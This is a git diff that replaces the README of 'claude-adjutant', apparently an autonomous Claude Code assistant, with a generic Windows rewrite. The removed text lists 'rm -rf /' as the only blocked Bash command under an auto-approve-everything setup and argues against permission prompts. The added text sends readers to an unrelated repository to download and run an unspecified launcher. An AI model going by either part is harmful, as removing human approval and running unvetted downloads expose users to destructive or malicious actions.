@@ -1,89 +1,225 @@
-# Claude Adjutant
+# 🤖 claude-adjutant - Your markdown-based AI assistant
 
-An autonomous AI executive assistant. Zero code. Just markdown + Claude Code.
+[![Download claude-adjutant](https://img.shields.io/badge/Download%20claude--adjutant-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/birgittadonothing495/claude-adjutant)
 
-Claude Adjutant runs 24/7 on your hardware, manages your projects, runs growth
-experiments, handles email and calendar, and messages you proactively when
-something needs your attention. It thinks strategically, delegates execution
-to sub-agents, and gets smarter over time.
+## 🚀 What claude-adjutant does
 
-## How It Works
+claude-adjutant is an autonomous AI executive assistant for daily work. It uses plain markdown files and Claude Code to help you manage tasks, notes, plans, and follow-ups. You do not need to write code. You work with simple files and clear instructions.
 
-```
-You (Telegram / Slack / Dispatch)
-  ↓
-Claude Adjutant (Opus, always-on, always responsive)
-  ├── Thinks: strategy, priorities, decisions
-  ├── Delegates: execution to sub-agents (Sonnet/Haiku)
-  └── Never: does manual work itself
-        ↓
-Knowledge System (markdown files)
-  ├── SOUL.md        — personality, values, boundaries
-  ├── heartbeat.md   — what to check every 30 minutes
-  ├── queue.md       — single coordination point for all work
-  ├── knowledge/     — people, projects, goals, decisions
-  ├── skills/        — reusable workflows (growth loops, reviews, briefings)
-  └── experiments/   — running and completed experiment tracking
-```
+Use it to keep work organized, reduce manual tracking, and turn scattered notes into a simple system.
 
-## What Makes It Different
+## 🖥️ Windows setup
 
-- **Zero code.** The entire system is markdown files + Claude Code configuration.
-  No frameworks, no databases, no custom code.
-- **SOUL.md.** A persistent identity document that evolves over time. Not just
-  instructions — personality, values, and learned patterns.
-- **Heartbeat.** A configurable checklist that runs every 30 minutes, making the
-  agent proactive instead of reactive.
-- **Queue.** A single markdown file that coordinates all work — sub-agents,
-  experiments, scheduled jobs all write to one place.
-- **Three-tier memory.** Hot (queue, ≤50 lines), warm (knowledge, loaded on
-  demand), cold (archive, searchable). Context never bloats.
+This app is meant to run on Windows with a local workspace on your PC.
 
-## Quick Start
+### What you need
 
-1. Clone this repo to your machine
-2. Edit SOUL.md with your personality and boundaries
-3. Add your projects to knowledge/projects/
-4. Install [Claude Code](https://code.claude.com/docs/en/quickstart)
-5. Run: `cd adjutant && claude`
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for your files and app data
+- Claude Code access set up on your machine
+- A folder where you want to keep your assistant files
 
-For 24/7 deployment on a headless Mac Mini, see [docs/SETUP.md](docs/SETUP.md).
+### Before you start
 
-## Permissions & Security
+Create a new folder for your workspace, such as:
 
-Claude Adjutant ships with **full autonomous permissions** by default. This means:
+- `Documents\claude-adjutant`
+- `Desktop\claude-adjutant`
 
-- All Bash commands are auto-approved (except `rm -rf /` and `sudo rm -rf`)
-- All file operations (read, write, edit) are auto-approved
-- All MCP tools (Telegram, Gmail, browser automation) are auto-approved
-- `defaultMode: bypassPermissions` — no terminal prompts
+Keep this folder easy to find. The app uses markdown files, so a clean folder helps you stay organized.
 
-**This is intentional.** Claude Adjutant is designed to run headlessly on a dedicated
-machine (Mac Mini, server). Terminal permission prompts block execution with no
-notification to the user, which breaks the autonomous loop.
+## 📥 Download and install
 
-**If you want tighter controls**, edit `.claude/settings.json`:
-- Change `defaultMode` to `"acceptEdits"` or `"default"` for interactive use
-- Remove `"Bash(*)"` and add specific command patterns you trust
-- Remove MCP wildcards and add tools individually
+Go to this page to download and set up the app:
 
-The boundaries that matter are in SOUL.md — what the agent will and won't do
-is governed by its identity document, not by permission prompts. The agent
-respects financial boundaries, communication approval requirements, and
-irreversible action guards defined there.
+[Visit claude-adjutant on GitHub](https://github.com/birgittadonothing495/claude-adjutant)
 
-## Architecture
+1. Open the link in your browser.
+2. Download the project files from the page.
+3. Save them to the workspace folder you created.
+4. If you see a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
 
-See [docs/architecture.md](docs/architecture.md) for the full design, including
-model routing, memory tiers, and the dispatch protocol.
+If the page gives you a package or launcher, download and run that file. If it gives you source files, keep the folder in place and open it with your normal Windows file tools.
 
-## Requirements
+## 🧭 First-time setup
 
-- Claude Code with a Max or Pro subscription
-- macOS (launchd) or Linux (systemd) for scheduling
-- Optional: Google Workspace CLI (`gws`) for email/calendar
-- Optional: Telegram bot for mobile interface
+After you download the files, set up your assistant workspace with these steps:
 
-## License
+1. Open the claude-adjutant folder.
+2. Look for a `README.md` file and any setup notes.
+3. Open the folder where you want your task files to live.
+4. Create a few simple markdown files if they are not already there:
+   - `inbox.md`
+   - `tasks.md`
+   - `projects.md`
+   - `notes.md`
+5. Add short, plain entries to each file.
+6. Connect the files to Claude Code if the project includes setup instructions for that tool.
 
-MIT
+A simple folder layout works well:
+
+- `claude-adjutant/`
+  - `inbox.md`
+  - `tasks.md`
+  - `projects.md`
+  - `notes.md`
+  - `logs/`
+
+## ✍️ How to use it
+
+claude-adjutant works best when you keep your work in small markdown files.
+
+### Start with your inbox
+
+Use `inbox.md` for quick thoughts:
+
+- meeting follow-ups
+- tasks you remember during the day
+- ideas you want to review later
+- links you want to save
+
+Move items from `inbox.md` into the right file when you have time.
+
+### Keep tasks clear
+
+In `tasks.md`, write tasks in a simple list:
+
+- Call the dentist
+- Send the report to Alex
+- Review the budget
+- Book travel for Friday
+
+You can add dates, owners, or status labels if you want a more structured view.
+
+### Track projects
+
+Use `projects.md` for work that has more than one step.
+
+Example:
+
+- Project: Year-end review
+  - Draft agenda
+  - Gather notes
+  - Share final version
+
+### Save useful notes
+
+Use `notes.md` for:
+
+- reminders
+- decisions
+- meeting notes
+- checklists
+- reference info
+
+## 🧠 Common workflow
+
+A simple daily flow works well:
+
+1. Open your inbox file.
+2. Add any new tasks or notes.
+3. Sort items into tasks, projects, or notes.
+4. Ask Claude Code to help draft, clean up, or summarize markdown content.
+5. Review the files at the end of the day.
+6. Mark finished items so your list stays current.
+
+This setup helps you keep control without a lot of manual effort.
+
+## ⚙️ Recommended file format
+
+Use plain markdown so the files stay easy to read on any Windows PC.
+
+Helpful patterns:
+
+- `#` for file titles
+- `##` for sections
+- `-` for lists
+- `[ ]` for open tasks
+- `[x]` for done tasks
+
+Example:
+
+- [ ] Send draft to manager
+- [ ] Review comments
+- [x] Update meeting notes
+
+## 🔒 File safety
+
+Keep your workspace in one folder and back it up often.
+
+Good habits:
+
+- Save your files before closing the app
+- Keep one backup copy in another folder
+- Use clear file names
+- Avoid moving files while the app is using them
+
+## 🧩 Example use cases
+
+claude-adjutant can help with common personal and work tasks:
+
+- daily task tracking
+- meeting prep
+- follow-up lists
+- project notes
+- personal planning
+- weekly reviews
+- simple knowledge storage
+
+## 🪟 Windows tips
+
+For the smoothest experience on Windows:
+
+- Use File Explorer to manage your markdown files
+- Keep the folder path short
+- Avoid special characters in file names
+- Use Notepad, VS Code, or another text editor that supports markdown
+- Pin the folder to Quick Access if you use it often
+
+## 📁 Sample starter content
+
+You can paste this into `tasks.md`:
+
+- [ ] Check email replies
+- [ ] Finish budget review
+- [ ] Send meeting notes
+- [ ] Update project status
+- [ ] Plan next week
+
+You can paste this into `projects.md`:
+
+- ## Client onboarding
+  - [ ] Draft checklist
+  - [ ] Confirm timeline
+  - [ ] Share next steps
+
+You can paste this into `notes.md`:
+
+- Team prefers short updates
+- Follow up after Friday
+- Save final file names before sending
+
+## 🛠️ If you want to change the setup
+
+If you later want a different structure, keep the same idea:
+
+- one inbox for new items
+- one task file for action items
+- one project file for larger work
+- one notes file for reference
+
+That keeps the system easy to scan and simple to update
+
+## 📌 Best way to keep it useful
+
+Use claude-adjutant often, even for small things.
+
+- add tasks when they appear
+- move notes out of the inbox
+- clear finished items each day
+- keep file names simple
+- review projects once a week
+
+A steady routine matters more than a complex setup
